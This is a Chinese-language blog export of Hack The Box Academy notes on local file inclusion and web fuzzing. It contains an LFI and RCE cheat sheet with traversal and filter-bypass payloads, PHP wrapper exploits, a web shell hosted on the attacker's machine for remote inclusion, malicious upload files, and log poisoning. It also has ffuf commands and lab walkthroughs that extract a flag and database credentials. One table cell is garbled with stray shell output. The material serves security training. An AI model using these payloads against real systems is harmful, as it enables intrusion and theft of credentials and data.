title="二阶攻击"></a>二阶攻击</h1><p>正如我们所看到的，LFI攻击可以有不同的形式。另一种常见的、更高级的LFI攻击是二阶攻击。这是因为许多web应用程序功能可能基于用户控制的参数从后端服务器不安全地提取文件。<br>例如，网络应用程序可能允许我们通过类似（&#x2F;profile&#x2F;$username&#x2F;avator.png）的URL下载我们的头像。如果我们伪造了一个恶意的LFI用户名（例如..&#x2F;..&#x2F;etc&#x2F;passwd），那么就有可能将被拉入的文件更改为服务器上的另一个本地文件，并将其获取，而不是我们的头像。<br>在这种情况下，我们将使用用户名中的恶意LFI负载毒害数据库条目。然后，另一个网络应用程序功能将利用这个中毒的条目来执行我们的攻击（即根据用户名值下载我们的头像）。这就是为什么这种攻击被称为二阶攻击。<br>开发人员经常忽略这些漏洞，因为他们可能会保护自己不受直接用户输入（例如，页面参数）的影响，但他们可能会信任从数据库中提取的值，比如本例中的用户名。如果我们在注册期间设法毒害了我们的用户名，那么攻击就有可能发生。<br>使用二阶攻击利用LFI漏洞与我们在本节中讨论的内容类似。唯一的差异是，我们需要发现一个函数，该函数根据我们间接控制的值提取文件，然后尝试控制该值以利用该漏洞。</p><h1 id="备忘录"><a href="#备忘录" class="headerlink" title="备忘录"></a>备忘录</h1><h2 id="本地文件包含"><a href="#本地文件包含" class="headerlink" title="本地文件包含"></a>本地文件包含</h2><table><thead><tr><th><strong>命令</strong></th><th><strong>描述</strong></th></tr></thead><tbody><tr><td><strong>基本</strong></td><td></td></tr><tr><td><code>/index.php?language=/etc/passwd</code></td><td>基本低频</td></tr><tr><td><code>/index.php?language=../../../../etc/passwd</code></td><td>具有路径遍历的 LFI</td></tr><tr><td><code>/index.php?language=/../../../etc/passwd</code></td><td>具有名称前缀的 LFI</td></tr><tr><td><code>/index.php?language=./languages/../../../../etc/passwd</code></td><td>具有已批准路径的 LFI</td></tr><tr><td><strong>LFI 旁路</strong></td><td></td></tr><tr><td><code>/index.php?language=....//....//....//....//etc/passwd</code></td><td>绕过基本路径遍历筛选器</td></tr><tr><td><code>/index.php?language=%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64</code></td><td>绕过使用 URL 编码的筛选器</td></tr><tr><td><code>/index.php?language=non_existing_directory/../../../etc/passwd/./././.[./ REPEATED ~2048 times]</code></td><td>绕过带有路径截断的附加扩展（已过时）</td></tr><tr><td><code>/index.php?language=../../../../etc/passwd%00</code></td><td>绕过带有空字节的附加扩展（已过时）</td></tr><tr><td><code>/index.php?language=php://filter/read=convert.base64-encode/resource=config</code></td><td>使用 base64 过滤器读取 PHP</td></tr></tbody></table><h2 id="远程代码执行"><a href="#远程代码执行" class="headerlink" title="远程代码执行"></a>远程代码执行</h2><table><thead><tr><th><strong>命令</strong></th><th><strong>描述</strong></th></tr></thead><tbody><tr><td><strong>PHP 包装器</strong></td><td></td></tr><tr><td><code>/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&amp;cmd=id</code></td><td>带数据包装器的 RCE</td></tr><tr><td><code>curl -s -X POST --data &#39;&lt;?php system($_GET[&quot;cmd&quot;]); ?&gt;&#39; &quot;http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php?language=php://input&amp;cmd=id&quot;</code></td><td>带输入包装器的 RCE</td></tr><tr><td><code>curl -s &quot;http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php?language=expect://id&quot;</code></td><td>带有预期包装器的 RCE</td></tr><tr><td><strong>射频 干扰</strong></td><td></td></tr><tr><td><code>echo &#39;&lt;?php system($_GET[&quot;cmd&quot;]); ?&gt;&#39; &gt; shell.php &amp;&amp; python3 -m http.server &lt;LISTENING_PORT&gt;</code></td><td>主机网络外壳</td></tr><tr><td><code>/index.php?language=http://&lt;OUR_IP&gt;:&lt;LISTENING_PORT&gt;/shell.php&amp;cmd=id</code></td><td>包括远程 PHP 网页外壳</td></tr><tr><td><strong>LFI + 上传</strong></td><td></td></tr><tr><td><code>echo &#39;GIF8&lt;?php system($_GET[&quot;cmd&quot;]); ?&gt;&#39; &gt; shell.gif</code></td><td>创建恶意映像</td></tr><tr><td><code>/index.php?language=./profile_images/shell.gif&amp;cmd=id</code></td><td>带有恶意上传图像的 RCE</td></tr><tr><td><code>echo &#39;&lt;?php system($_GET[&quot;cmd&quot;]); ?&gt;&#39; &gt; shell.php &amp;&amp; zip shell.jpg shell.php</code></td><td>创建恶意 zip 存档“作为 jpg”</td></tr><tr><td><code>/index.php?language=zip://shell.zip%23shell.php&amp;cmd=id</code></td><td>带有恶意上传的 zip 的 RCE</td></tr><tr><td><code>php --define phar.readonly=0 shell.php &amp;&amp; mv shell.phar shell.jpg</code></td><td>创建恶意 phar “作为 jpg”</td></tr><tr><td><code>/index.php?language=phar://./profile_images/shell.jpg%2Fshell.txt&amp;cmd=id</code></td><td>带有恶意上传的 phar 的 RCE</td></tr><tr><td><strong>日志中毒</strong></td><td></td></tr><tr><td><code>/index.php?language=/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd</code></td><td>读取 PHP 会话参数</td></tr><tr><td><code>/index.php?language=%3C%3Fphp%20system%28%24_GET%5B%22cmd%22%5D%29%3B%3F%3E</code></td><td>xxxxxxxxxx3 1htb_student@NIX02:~$  ls ~&#x2F;.ssh2​3id_rsa  id_rsa.pub  known_hostsshell-session</td></tr><tr><td><code>/index.php?language=/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd&amp;cmd=id</code></td><td>RCE 通过中毒的 PHP 会话</td></tr><tr><td><code>curl -s &quot;http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php&quot; -A &#39;&lt;?php system($_GET[&quot;cmd&quot;]); ?&gt;&#39;</code></td><td>中毒服务器日志</td></tr><tr><td><code>/index.php?language=/var/log/apache2/access.log&amp;cmd=id</code></td><td>RCE 通过中毒的 PHP 会话</td></tr></tbody></table><h2 id="杂项"><a href="#杂项" class="headerlink" title="杂项"></a>杂项</h2><table><thead><tr><th><strong>命令</strong></th><th><strong>描述</strong></th></tr></thead><tbody><tr><td><code>ffuf -w /opt/useful/SecLists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u &#39;http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php?FUZZ=value&#39; -fs 2287</code></td><td>模糊页面参数</td></tr><tr><td><code>ffuf -w /opt/useful/SecLists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ -u &#39;http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php?language=FUZZ&#39; -fs 2287</code></td><td>模糊 LFI 有效载荷</td></tr><tr><td><code>ffuf -w /opt/useful/SecLists/Discovery/Web-Content/default-web-root-directory-linux.txt:FUZZ -u &#39;http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php?language=../../../../FUZZ/index.php&#39; -fs 2287</code></td><td>模糊网络根路径</td></tr><tr><td><code>ffuf -w ./LFI-WordList-Linux:FUZZ -u &#39;http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php?language=../../../../FUZZ&#39; -fs 2287</code></td><td>模糊服务器配置</td></tr><tr><td><a href="https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI">LFI词表</a></td><td></td></tr><tr><td><a href="https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/LFI/LFI-Jhaddix.txt">LFI-贾迪克斯.txt</a></td><td></td></tr><tr><td><a href="https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/default-web-root-directory-linux.txt">适用于 Linux 的 Webroot 路径单词列表</a></td><td></td></tr><tr><td><a href="https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/default-web-root-directory-windows.txt">适用于 Windows 的 Webroot 路径单词列表</a></td><td></td></tr><tr><td><a href="https://raw.githubusercontent.com/DragonJAR/Security-Wordlist/main/LFI-WordList-Linux">适用于 Linux 的服务器配置词表</a></td><td></td></tr><tr><td><a href="https://raw.githubusercontent.com/DragonJAR/Security-Wordlist/main/LFI-WordList-Windows">适用于 Windows 的服务器配置词表</a></td><td></td></tr></tbody></table><h1 id="practice"><a href="#practice" class="headerlink" title="practice"></a>practice</h1><pre><code>target:139.59.185.174:31300使用文件包含在系统中查找以“b”开头的用户的名称。提交位于/usr/share/flags目录中的flag.txt文件的内容。</code></pre><p>先打开网站：</p><p><img src="/img/File_inclusion_1.png" alt="1"></p><p>看看切换语言的效果：</p><p><img src="/img/File_inclusion_2.png" alt="2"></p><p>发先url里面有文件包含，直接向前遍历<code>../../../../etc/passwd</code></p><p><img src="/img/File_inclusion_3.png" alt="1"></p><p>第二题就不用多说了。</p><h1 id="Basic-Bypasses"><a href="#Basic-Bypasses" class="headerlink" title="Basic Bypasses"></a>Basic Bypasses</h1><h2 id="非递归路径遍历过滤器"><a href="#非递归路径遍历过滤器" class="headerlink" title="非递归路径遍历过滤器"></a>非递归路径遍历过滤器</h2><p>针对LFI的最基本的过滤器之一是搜索和替换过滤器，它只删除（..&#x2F;）的子字符串以避免路径遍历。例如：</p><pre><code>$language = str_replace(&#39;../&#39;, &#39;&#39;, $_GET[&#39;language&#39;]);</code></pre><p>这个过滤器是非常不安全的，因为它不是递归地删除..&#x2F;子字符串，因为它在输入字符串上运行一次，而不在输出字符串上应用筛选器。</p><p><code>http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php?language=....//....//....//....//etc/passwd</code></p><p><code>….//</code>子字符串并不是我们可以使用的唯一旁路，因为我们可以使用<code>…/./</code>或<code>....\/</code>以及若干其它递归LFI有效载荷。此外，在某些情况下，转义正斜杠字符也可以避免路径遍历过滤器（例如….&#x2F;）或添加额外的正斜杠（例如…..&#x2F;&#x2F;&#x2F;）</p><h2 id="编码"><a href="#编码" class="headerlink" title="编码"></a>编码</h2><p>一些网络过滤器可能会阻止包含某些LFI相关字符（如点）的输入过滤器。或斜线&#x2F;用于路径遍历。然而，对我们的输入进行URL编码可能会绕过其中一些过滤器，这样它就不再包括这些坏字符，但一旦到达易受攻击的函数，仍然会被解码回我们的路径遍历字符串。5.3.4及更早版本上的核心PHP过滤器特别容易受到这种绕过的影响，但即使在较新版本上，我们也可能发现可以通过URL编码绕过的自定义过滤器。<br>如果目标web应用程序不允许。和&#x2F;在我们的输入中，我们可以URL编码..&#x2F;进入%2e%2e%2f，这可能会绕过过滤器。</p><h2 id="Approved-Paths"><a href="#Approved-Paths" class="headerlink" title="Approved Paths"></a>Approved Paths</h2><p>一些web应用程序还可以使用正则表达式来确保所包含的文件位于特定路径下。例如，我们一直在处理的web应用程序可能只接受下面的路径&#x2F;languages目录，如下所示：</p><pre><code>if(preg_match(&#39;/^\.\/languages\/.+$/&#39;, $_GET[&#39;language&#39;])) &#123;    include($_GET[&#39;language&#39;]);&#125; else &#123;    echo &#39;Illegal path specified!&#39;;&#125;</code></pre><p>要找到批准的路径，我们可以检查现有表单发送的请求，并查看它们用于正常web功能的路径。此外，我们可以模糊相同路径下的web目录，并尝试不同的目录，直到我们得到匹配。为了绕过这一点，我们可以使用路径遍历，并使用批准的路径启动有效负载，然后使用..&#x2F;返回根目录并读取我们指定的文件，如下所示：</p><p><code>&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php?language=./languages/../../../../etc/passwd</code></p><h2 id="附加扩展名"><a href="#附加扩展名" class="headerlink" title="附加扩展名"></a>附加扩展名</h2><p>如前一节所述，一些web应用程序在我们的输入字符串（例如.php）中附加了一个扩展名，以确保我们包含的文件是预期的扩展名。对于现代版本的PHP，我们可能无法绕过这一点，并且将被限制为仅读取该扩展名中的文件，这可能仍然很有用，正如我们将在下一节中看到的那样（例如，用于读取源代码）。<br>我们可以使用其他一些技术，但它们在现代版本的PHP中已经过时，只能用于5.3&#x2F;5.4之前的PHP版本。然而，提到它们可能仍然是有益的，因为一些web应用程序可能仍然运行在较旧的服务器上，而这些技术可能是唯一可能的绕过方法。</p><h3 id="路径截断"><a href="#路径截断" class="headerlink" title="路径截断"></a>路径截断</h3><p>在早期版本的PHP中，定义的字符串的最大长度为4096个字符，这可能是由于32位系统的限制。如果传递一个较长的字符串，它将被截断，并且超过最大长度的任何字符都将被忽略。此外，PHP还用于删除路径名中的尾随斜杠和单点，因此如果我们调用（<code>/etc/passwd/.</code>），则使用&#x2F;。也将被截断，PHP将调用（<code>/etc/passwd</code>）。PHP和Linux系统通常也会忽略路径中的多个斜杠（例如<code>///etc/passwd</code>与<code>/etc/passwd</code>相同）。类似地，路径中间的当前目录快捷方式（<code>.</code>）也将被忽略（例如<code>/etc/./passwd</code>）。</p><p>这种有效载荷的一个例子如下：</p><pre><code>?language=non_existing_directory/../../../etc/passwd/./././.[./ REPEATED ~2048 times]</code></pre><p>当然，我们不必手动键入。&#x2F;2048次（总共4096个字符），但我们可以使用以下命令自动创建此字符串：</p><pre><code>echo -n &quot;non_existing_directory/../../../etc/passwd/&quot; &amp;&amp; for i in &#123;1..2048&#125;; do echo -n &quot;./&quot;; donenon_existing_directory/../../../etc/passwd/./././&lt;SNIP&gt;././././</code></pre><h3 id="Null字节"><a href="#Null字节" class="headerlink" title="Null字节"></a>Null字节</h3><p>5.5之前的PHP版本容易受到空字节注入的攻击，这意味着在字符串末尾添加一个空字节（%00）会终止字符串，而不会考虑后面的任何内容。这是由于字符串在低级别内存中的存储方式，内存中的字符串必须使用空字节来指示字符串的末尾，如Assembly、C或C++语言中所示。<br>要利用此漏洞，我们可以用一个空字节（例如&#x2F;etc&#x2F;passwd%00）来结束负载，这样传递给include（）的最终路径将是（&#x2F;etc&#x2F;passwd&#x2F;00.php）。这样，即使php被附加到我们的字符串中，空字节之后的任何内容都会被截断，因此使用的路径实际上是&#x2F;etc&#x2F;passwd，从而使我们绕过附加的扩展。</p><h2 id="practice-1"><a href="#practice-1" class="headerlink" title="practice"></a>practice</h2><pre><code>target:159.65.60.16:31498上述web应用程序采用了多个过滤器来避免LFI被利用。尝试绕过这些筛选器来读取/flag.txt</code></pre><p><img src="/img/File_inclusion_4.png" alt="1"></p><p>应该就加了一个标准路径language和非递归过滤器</p><h1 id="PHP过滤器-PHP-Filters"><a href="#PHP过滤器-PHP-Filters" class="headerlink" title="PHP过滤器-PHP Filters"></a>PHP过滤器-<a href="https://www.php.net/manual/en/filters.php">PHP Filters</a></h1><p>许多流行的web应用程序都是用PHP开发的，还有使用不同PHP框架构建的各种自定义web应用程序，如Laravel或Symfony。如果我们在PHP web应用程序中发现LFI漏洞，那么我们可以利用不同的PHP包装来扩展我们的LFI攻击，甚至可能达到远程代码执行。<br>PHP包装器允许我们在应用程序级别访问不同的I&#x2F;O流，如标准输入&#x2F;输出、文件描述符和内存流。这对PHP开发人员有很多用处。尽管如此，作为网络渗透测试人员，我们可以利用这些包装来扩展我们的利用攻击，并能够读取PHP源代码文件，甚至执行系统命令。这不仅有利于LFI攻击，也有利于其他网络攻击，如XXE，如网络攻击模块所述。<br>在本节中，我们将了解如何使用基本的PHP过滤器来读取PHP源代码，在下一节中，将了解不同的PHP包装器如何帮助我们通过LFI漏洞获得远程代码执行。</p><h2 id="Input-Filters"><a href="#Input-Filters" class="headerlink" title="Input Filters"></a>Input Filters</h2><p>PHP过滤器是一种PHP包装器，在这里我们可以传递不同类型的输入，并由我们指定的过滤器进行过滤。要使用PHP包装流，我们可以在字符串中使用<code>PHP://</code>方案，并且我们可以使用<code>php://filter/.</code><br>过滤器包装器有几个参数，但我们攻击所需的主要参数是<code>resource</code>和<code>read</code>。过滤器包装器需要<code>resource</code>参数，使用它我们可以指定要对其应用过滤器的流（例如本地文件），而<code>read</code>参数可以对输入资源应用不同的过滤器，因此我们可以使用它来指定要对资源应用哪个过滤器。</p><p>有四种不同类型的过滤器可供使用， <a href="https://www.php.net/manual/en/filters.string.php">String Filters</a>, <a href="https://www.php.net/manual/en/filters.convert.php">Conversion Filters</a>, <a href="https://www.php.net/manual/en/filters.compression.php">Compression Filters</a>, and <a href="https://www.php.net/manual/en/filters.encryption.php">Encryption Filters</a>. 可以在各自的链接上阅读更多关于每个过滤器的信息，但对LFI攻击有用的过滤器是Conversion Filters下的convert.base64-encode过滤器。</p><h2 id="Fuzzing-for-PHP-Files"><a href="#Fuzzing-for-PHP-Files" class="headerlink" title="Fuzzing for PHP Files"></a>Fuzzing for PHP Files</h2><p>第一步是使用ffuf或gobuster等工具对不同的可用PHP页面进行模糊处理，与正常的web应用程序使用不同，我们不限于HTTP响应代码为200的页面，因为我们有本地文件包含访问权限，所以我们应该扫描所有代码，包括“301”、“302”和“403”页面，我们也应该能够读取它们的源代码。</p><h2 id="标准PHP包含"><a href="#标准PHP包含" class="headerlink" title="标准PHP包含"></a>标准PHP包含</h2><p>在前面的小节中，如果您试图通过LFI包含任何php文件，您会注意到包含的php文件会被执行，并最终被呈现为普通的HTML页面。例如，让我们尝试包含config.php页面（web应用程序附加的.php扩展名）：</p><p><code>http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php?language=config</code></p><p>正如我们所看到的，我们得到了一个空的结果来代替LFI字符串，因为config.php很可能只设置web应用程序配置，而不呈现任何HTML输出。<br>这在某些情况下可能很有用，比如访问我们无法访问的本地PHP页面（即SSRF），但在大多数情况下，我们更感兴趣的是通过LFI阅读PHP源代码，因为源代码往往会揭示有关web应用程序的重要信息。这就是base64 php过滤器变得有用的地方，因为我们可以使用它对php文件进行base64编码，然后我们将获得编码的源代码，而不是执行和渲染它。这对于我们处理带有附加PHP扩展的LFI的情况尤其有用，因为我们可能被限制为仅包括PHP文件，如前一节所述。</p><h2 id="代码泄露-Source-Code-Disclosure"><a href="#代码泄露-Source-Code-Disclosure" class="headerlink" title="代码泄露-Source Code Disclosure"></a>代码泄露-Source Code Disclosure</h2><p>一旦我们有了想要读取的潜在PHP文件的列表，我们就可以开始使用base64 PHP过滤器公开它们的来源。让我们尝试使用base64过滤器读取config.php的源代码，方法是为read参数指定convert.base64-encode，为resource参数指定config，如下所示：</p><pre><code>php://filter/read=convert.base64-encode/resource=config</code></pre><p><code>http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php?language=php://filter/read=convert.base64-encode/resource=config</code></p><p>正如我们所看到的，与我们使用常规LFI的尝试不同，使用base64过滤器返回了一个编码的字符串，而不是我们之前看到的空结果。我们现在可以对这个字符串进行解码，以获得config.php源代码的内容，如下所示：</p><pre><code>echo &#39;PD9waHAK...SNIP...KICB9Ciov&#39; | base64 -d...SNIP...if ($_SERVER[&#39;REQUEST_METHOD&#39;] == &#39;GET&#39; &amp;&amp; realpath(__FILE__) == realpath($_SERVER[&#39;SCRIPT_FILENAME&#39;])) &#123;  header(&#39;HTTP/1.0 403 Forbidden&#39;, TRUE, 403);  die(header(&#39;location: /index.php&#39;));&#125;...SNIP...</code></pre><h2 id="practice-2"><a href="#practice-2" class="headerlink" title="practice"></a>practice</h2><pre><code>target:178.62.18.68:32380</code></pre><ul><li>为其他php脚本模糊web应用程序，然后读取其中一个配置文件并提交数据库密码作为答案</li></ul><p>kali扫一扫：</p><pre><code>ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://178.62.18.68:32380/FUZZ -e .php -recursion -recursion-depth 1 -v  -t 80 | grep URL        /&#39;___\  /&#39;___\           /&#39;___\              /\ \__/ /\ \__/  __  __  /\ \__/              \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\              \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/               \ \_\   \ \_\  \ \____/  \ \_\                 \/_/    \/_/   \/___/    \/_/              v1.3.1 Kali Exclusive &lt;3________________________________________________ :: Method           : GET :: URL              : http://178.62.18.68:32380/FUZZ :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt :: Extensions       : .php  :: Follow redirects : false :: Calibration      : false :: Timeout          : 10 :: Threads          : 80 :: Matcher          : Response status: 200,204,301,302,307,401,403,405________________________________________________| URL | http://178.62.18.68:32380/#| URL | http://178.62.18.68:32380/# Copyright 2007 James Fisher| URL | http://178.62.18.68:32380/# on at least 3 different hosts.php| URL | http://178.62.18.68:32380/#.php| URL | http://178.62.18.68:32380/# license, visit http://creativecommons.org/licenses/by-sa/3.0/| URL | http://178.62.18.68:32380/# Attribution-Share Alike 3.0 License. To view a copy of this| URL | http://178.62.18.68:32380/# Attribution-Share Alike 3.0 License. To view a copy of this.php| URL | http://178.62.18.68:32380/# license, visit http://creativecommons.org/licenses/by-sa/3.0/.php| URL | http://178.62.18.68:32380/# or send a letter to Creative Commons, 171 Second Street,| URL | http://178.62.18.68:32380/index.php| URL | http://178.62.18.68:32380/#.php| URL | http://178.62.18.68:32380/#| URL | http://178.62.18.68:32380/#| URL | http://178.62.18.68:32380/# directory-list-2.3-small.txt| URL | http://178.62.18.68:32380/# or send a letter to Creative Commons, 171 Second Street,.php| URL | http://178.62.18.68:32380/#.php| URL | http://178.62.18.68:32380/# This work is licensed under the Creative Commons| URL | http://178.62.18.68:32380/# Copyright 2007 James Fisher.php| URL | http://178.62.18.68:32380/#.php| URL | http://178.62.18.68:32380/| URL | http://178.62.18.68:32380/# Suite 300, San Francisco, California, 94105, USA.| URL | http://178.62.18.68:32380/# Priority-ordered case-sensitive list, where entries were found| URL | http://178.62.18.68:32380/# This work is licensed under the Creative Commons.php| URL | http://178.62.18.68:32380/.php| URL | http://178.62.18.68:32380/# Priority-ordered case-sensitive list, where entries were found.php| URL | http://178.62.18.68:32380/#| URL | http://178.62.18.68:32380/# directory-list-2.3-small.txt.php| URL | http://178.62.18.68:32380/# Suite 300, San Francisco, California, 94105, USA..php| URL | http://178.62.18.68:32380/# on at least 3 different hosts| URL | http://178.62.18.68:32380/en.php| URL | http://178.62.18.68:32380/es.php| URL | http://178.62.18.68:32380/configure.php</code></pre><p>到这里先扫到一个configure.php，try一try：</p><pre><code>http://178.62.18.68:32380/index.php?language=php://filter/read=convert.base64-encode/resource=configure</code></pre><p>读到了：</p><pre><code>         PD9waHAKCmlmICgkX1NFUlZFUlsnUkVRVUVTVF9NRVRIT0QnXSA9PSAnR0VUJyAmJiByZWFscGF0aChfX0ZJTEVfXykgPT0gcmVhbHBhdGgoJF9TRVJWRVJbJ1NDUklQVF9GSUxFTkFNRSddKSkgewogIGhlYWRlcignSFRUUC8xLjAgNDAzIEZvcmJpZGRlbicsIFRSVUUsIDQwMyk7CiAgZGllKGhlYWRlcignbG9jYXRpb246IC9pbmRleC5waHAnKSk7Cn0KCiRjb25maWcgPSBhcnJheSgKICAnREJfSE9TVCcgPT4gJ2RiLmlubGFuZWZyZWlnaHQubG9jYWwnLAogICdEQl9VU0VSTkFNRScgPT4gJ3Jvb3QnLAogICdEQl9QQVNTV09SRCcgPT4gJ0hUQntuM3Yzcl8kdDByM19wbDQhbnQzeHRfY3IzZCR9JywKICAnREJfREFUQUJBU0UnID0+ICdibG9nZGInCik7CgokQVBJX0tFWSA9ICJBd2V3MjQyR0RzaHJmNDYrMzUvayI7            </code></pre><p>解码一下：</p><pre><code>echo PD9waHAKCmlmICgkX1NFUlZFUlsnUkVRVUVTVF9NRVRIT0QnXSA9PSAnR0VUJyAmJiByZWFscGF0aChfX0ZJTEVfXykgPT0gcmVhbHBhdGgoJF9TRVJWRVJbJ1NDUklQVF9GSUxFTkFNRSddKSkgewogIGhlYWRlcignSFRUUC8xLjAgNDAzIEZvcmJpZGRlbicsIFRSVUUsIDQwMyk7CiAgZGllKGhlYWRlcignbG9jYXRpb246IC9pbmRleC5waHAnKSk7Cn0KCiRjb25maWcgPSBhcnJheSgKICAnREJfSE9TVCcgPT4gJ2RiLmlubGFuZWZyZWlnaHQubG9jYWwnLAogICdEQl9VU0VSTkFNRScgPT4gJ3Jvb3QnLAogICdEQl9QQVNTV09SRCcgPT4gJ0hUQntuM3Yzcl8kdDByM19wbDQhbnQzeHRfY3IzZCR9JywKICAnREJfREFUQUJBU0UnID0+ICdibG9nZGInCik7CgokQVBJX0tFWSA9ICJBd2V3MjQyR0RzaHJmNDYrMzUvayI7 | base64 -d    &lt;?phpif ($_SERVER[&#39;REQUEST_METHOD&#39;] == &#39;GET&#39; &amp;&amp; realpath(__FILE__) == realpath($_SERVER[&#39;SCRIPT_FILENAME&#39;])) &#123;  header(&#39;HTTP/1.0 403 Forbidden&#39;, TRUE, 403);  die(header(&#39;location: /index.php&#39;));&#125;$config = array(  &#39;DB_HOST&#39; =&gt; &#39;db.inlanefreight.local&#39;,  &#39;DB_USERNAME&#39; =&gt; &#39;root&#39;,  &#39;DB_PASSWORD&#39; =&gt; &#39;HTB&#123;n3v3r_$t0r3_pl4!nt3xt_cr3d$&#125;&#39;,  &#39;DB_DATABASE&#39; =&gt; &#39;blogdb&#39;);$API_KEY = &quot;Awew242GDshrf46+35/k&quot;;   </code></pre><p>HTB{n3v3r_$t0r3_pl4!nt3xt_cr3d$}</p>]]></content>
      
      
      
        <tags>
            
            <tag> base </tag>
            
            <tag> practice </tag>
            
            <tag> hackthebox </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Fuzzing</title>
      <link href="/2023/06/14/Fuzzing/"/>
      <url>/2023/06/14/Fuzzing/</url>
      
        <content type="html"><![CDATA[<h3 id="子域模糊-Sub-domain-Fuzzing"><a href="#子域模糊-Sub-domain-Fuzzing" class="headerlink" title="子域模糊 (Sub-domain Fuzzing)"></a>子域模糊 (Sub-domain Fuzzing)</h3><pre><code>target: HackTheBox有一个在线Swag商店。试着在“hacktebox.eu”上运行子域模糊测试来找到它。它的完整域是什么？</code></pre><span id="more"></span><p>kali跑一下：</p><pre><code> ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt:FUZZ -u https://FUZZ.hackthebox.eu/         /&#39;___\  /&#39;___\           /&#39;___\              /\ \__/ /\ \__/  __  __  /\ \__/              \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\              \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/               \ \_\   \ \_\  \ \____/  \ \_\                 \/_/    \/_/   \/___/    \/_/              v1.3.1 Kali Exclusive &lt;3________________________________________________ :: Method           : GET :: URL              : https://FUZZ.hackthebox.eu/ :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt :: Follow redirects : false :: Calibration      : false :: Timeout          : 10 :: Threads          : 40 :: Matcher          : Response status: 200,204,301,302,307,401,403,405________________________________________________www                     [Status: 301, Size: 0, Words: 1, Lines: 1]forum                   [Status: 301, Size: 0, Words: 1, Lines: 1]dev                     [Status: 302, Size: 0, Words: 1, Lines: 1]store                   [Status: 301, Size: 0, Words: 1, Lines: 1]forums                  [Status: 301, Size: 0, Words: 1, Lines: 1]app                     [Status: 301, Size: 0, Words: 1, Lines: 1]help                    [Status: 301, Size: 0, Words: 1, Lines: 1]dev2                    [Status: 302, Size: 0, Words: 1, Lines: 1]billing                 [Status: 302, Size: 101, Words: 5, Lines: 1]</code></pre><p>答案应该是这个store很难跑了：<code>https://store.hackthebox.eu</code></p><h4 id="Vhost-Fuzzing"><a href="#Vhost-Fuzzing" class="headerlink" title="Vhost Fuzzing"></a>Vhost Fuzzing</h4><p>​我们能够使用公共DNS记录模糊公共子域。然而，当涉及到模糊没有公共DNS记录的子域或非公共网站下的子域时，我们不能使用相同的方法。在本节中，我们将学习如何使用Vhost Fuzzing来做到这一点。</p><h5 id="Vhosts-vs-Sub-domains"><a href="#Vhosts-vs-Sub-domains" class="headerlink" title="Vhosts vs. Sub-domains"></a>Vhosts vs. Sub-domains</h5><p>​VHosts和子域之间的关键区别在于，VHost基本上是在同一服务器上服务的“子域”，并且具有相同的IP，因此单个IP可以服务于两个或多个不同的网站。<br>VHosts可能有也可能没有公共DNS记录。<br>​在许多情况下，许多网站实际上会有非公共的子域，并且不会在公共DNS记录中发布它们，因此，如果我们在浏览器中访问它们，我们将无法连接，因为公共DNS不会知道它们的IP。再一次，如果我们使用子域模糊，我们将只能识别公共子域，但无法识别任何非公共子域。<br>​这就是我们在现有IP上使用VHosts Fuzzing的地方。我们将在同一IP上运行扫描和测试扫描，然后我们将能够识别公共和非公共子域以及VHosts。</p><p>要扫描VHosts，而无需手动将整个单词列表添加到&#x2F;etc&#x2F;hosts，我们将模糊HTTP标头，特别是Host:header。为此，我们可以使用-H标志来指定一个标头，并在其中使用FUZZ关键字，如下所示：</p><pre><code>ffuf -w /opt/useful/SecLists/Discovery/DNS/subdomains-top1million-5000.txt:FUZZ -u http://academy.htb:PORT/ -H &#39;Host: FUZZ.academy.htb&#39;</code></pre><h5 id="筛选结果"><a href="#筛选结果" class="headerlink" title="筛选结果"></a>筛选结果</h5><pre><code>ffuf -h...SNIP...MATCHER OPTIONS:  -mc              Match HTTP status codes, or &quot;all&quot; for everything. (default: 200,204,301,302,307,401,403)  -ml              Match amount of lines in response  -mr              Match regexp  -ms              Match HTTP response size  -mw              Match amount of words in responseFILTER OPTIONS:  -fc              Filter HTTP status codes from response. Comma separated list of codes and ranges  -fl              Filter by amount of lines in response. Comma separated list of line counts and ranges  -fr              Filter regexp  -fs              Filter HTTP response size. Comma separated list of sizes and ranges  -fw              Filter by amount of words in response. Comma separated list of word counts and ranges</code></pre><p>​我们知道错误结果的响应大小，从上面的测试中可以看出，是900，我们可以用-fs 900过滤掉它。</p><pre><code>ffuf -w /opt/useful/SecLists/Discovery/DNS/subdomains-top1million-5000.txt:FUZZ -u http://academy.htb:PORT/ -H &#39;Host: FUZZ.academy.htb&#39; -fs 900</code></pre><h5 id="prectice"><a href="#prectice" class="headerlink" 